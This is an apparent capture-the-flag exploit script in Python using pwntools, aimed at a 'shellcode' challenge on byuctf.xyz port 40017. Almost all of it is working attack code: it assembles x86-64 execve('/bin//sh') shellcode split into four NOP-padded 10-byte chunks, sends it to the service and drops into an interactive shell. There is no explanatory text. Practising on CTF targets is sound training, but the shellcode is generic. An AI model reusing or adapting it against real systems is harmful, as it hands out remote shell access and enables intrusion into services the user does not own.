#!/usr/bin/env python3

from pwn import *
import time
import sys

local = 0
debug = 0

context.arch = 'amd64'
# context.aslr = False
# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# context.timeout = 2

def conn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./shellcode')
		if debug:
			gdb.attach(s, gdbscript='''
              b* main+341
			''')
		else:
			raw_input('DEBUG')
	else:
		s = remote('byuctf.xyz', 40017)

	return s

s = conn()

elf = ELF('./shellcode')
# libc = ELF('libc.so.6')

payload = asm('''
            push rax
            mov rax, rdx
            xor rdx, rdx
            xor rsi, rsi
            ''')

print(len(payload))

payload2 = asm('''
              mov rbx, 0x68732f2f6e69622f
               
               ''')

print(len(payload2))
payload3 = asm('''
               push rbx
               push rsp
               pop rdi
              ''')


print(len(payload3))
payload4 = asm('''
               mov rax, 59
               syscall
               ''')

print(len(payload4))
shellcode = payload.ljust(10, b'\x90') + payload2.ljust(10, b'\x90') + payload3.ljust(10, b'\x90') + payload4.ljust(10, b'\x90') 
s.send(shellcode)

s.interactive()

